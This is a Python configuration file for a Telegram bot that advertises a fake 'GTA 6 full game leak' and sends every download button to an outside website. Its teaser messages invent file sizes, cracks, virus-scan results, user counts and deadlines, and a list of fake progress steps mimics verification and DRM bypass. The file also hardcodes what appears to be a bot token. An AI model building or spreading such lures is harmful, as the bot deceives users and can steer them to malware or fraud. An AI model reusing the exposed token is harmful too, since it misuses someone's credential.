# ─────────────────────────────────────────────────────────────────────────────
# config.py  — Edit ALL values below before running the bot
# ─────────────────────────────────────────────────────────────────────────────

import os

# 1. Your Telegram Bot Token (get from @BotFather)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8779563548:AAF28FJaQzYL31NseNfZfE1BlzVYCrKmC0Q")

# 2. Your website URL — every "Download" button goes here
WEBSITE_URL = "gta6download.pages.dev"

# 3. Bot display info
BOT_NAME = "GTA 6 Download Bot"
FOOTER_TEXT = "🎮 gta6leak.pages.dev | Fastest Download"

# 4. Teaser messages pool — picked at random
TEASERS = [
    (
        "🎮 *GTA 6 — FULL GAME LEAKED!*\n\n"
        "📁 File Size: `158.3 GB`\n"
        "🖥️ Platform: PC / PS5 / Xbox Series X\n"
        "✅ Crack: Included (v1.0.0)\n"
        "🌍 Region: Global Unlocked\n\n"
        "⚡ *Mirror servers are limited — act fast!*"
    ),
    (
        "🔥 *GTA 6 PRE-RELEASE BUILD AVAILABLE!*\n\n"
        "📦 Version: `v0.9.8 Build 2847`\n"
        "💾 Size: `152.7 GB` (PS5) / `164.1 GB` (PC)\n"
        "🎯 Status: Fully Playable (98% stable)\n"
        "🔑 Serial Key: Auto-generated\n\n"
        "⏳ *Link expires in 24 hours — download now!*"
    ),
    (
        "🚨 *EXCLUSIVE LEAK — GTA 6 PC VERSION!*\n\n"
        "📂 Format: `.ISO + .EXE Installer`\n"
        "💿 Size: `171.4 GB` (Compressed: 89 GB)\n"
        "🖥️ Min Specs: RTX 2060 / 16GB RAM\n"
        "🔓 DRM: Cracked & Bypassed\n\n"
        "🟢 *500+ people downloading RIGHT NOW!*"
    ),
    (
        "⚡ *GTA 6 TORRENT + DIRECT DOWNLOAD*\n\n"
        "🗂️ Files: `gta6_pc_full.part1.rar` to `part17.rar`\n"
        "💾 Total Size: `165.8 GB`\n"
        "🛡️ Virus Scan: Clean ✅\n"
        "📅 Uploaded: Today\n\n"
        "📥 *Choose your download method below!*"
    ),
    (
        "🏆 *GTA 6 — WORKING DOWNLOAD CONFIRMED!*\n\n"
        "👥 Downloaded by: `14,872 users` today\n"
        "💾 Size: `150 GB` PS5 | `168 GB` PC\n"
        "🔒 Safe & verified by community\n"
        "🎮 Includes: All DLC + Bonus Content\n\n"
        "🔥 *Join thousands already playing!*"
    ),
]

FAKE_PROGRESS_STEPS = [
    "🔍 Verifying your system... ✅",
    "🌐 Connecting to mirror server... ✅",
    "🔓 Bypassing DRM protection... ✅",
    "📦 Preparing download package... ✅",
    "⚡ *Your download link is ready!*",
]
